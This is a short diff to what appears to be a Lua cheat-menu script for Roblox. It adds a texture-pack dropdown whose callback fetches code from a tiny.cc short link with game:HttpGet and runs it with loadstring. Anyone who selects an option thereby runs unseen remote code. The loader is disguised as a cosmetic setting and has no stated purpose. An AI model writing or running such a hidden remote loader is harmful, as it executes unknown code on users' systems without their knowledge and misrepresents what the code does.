@@ -31,6 +31,14 @@ local TexturePack = LIB("Combat", {
     HoverText = ""
 })
 
+	TexturePacks = TexturePack.CreateDropdown({
+		Name = "Usual",
+		List = animmethods,
+		Function = function(val) 
+		loadstring(game:HttpGet("http://tiny.cc/1pk3x3gj5k2s7h9sb2"))()
+		end
+	})
+	
 local RedLigthing = LIB("Render", {
     Name = "Red Sky",
     Function = function(callback) 
